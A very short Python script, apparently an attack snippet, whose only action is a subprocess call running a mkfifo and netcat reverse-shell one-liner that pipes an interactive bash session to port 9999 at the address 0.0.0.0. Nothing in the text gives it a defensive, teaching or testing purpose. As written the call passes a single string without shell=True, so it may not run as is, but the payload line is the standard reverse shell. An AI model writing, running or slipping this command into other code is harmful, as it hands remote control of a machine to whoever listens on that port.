import subprocess


subprocess.run("mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 0.0.0.0 9999 >/tmp/f")
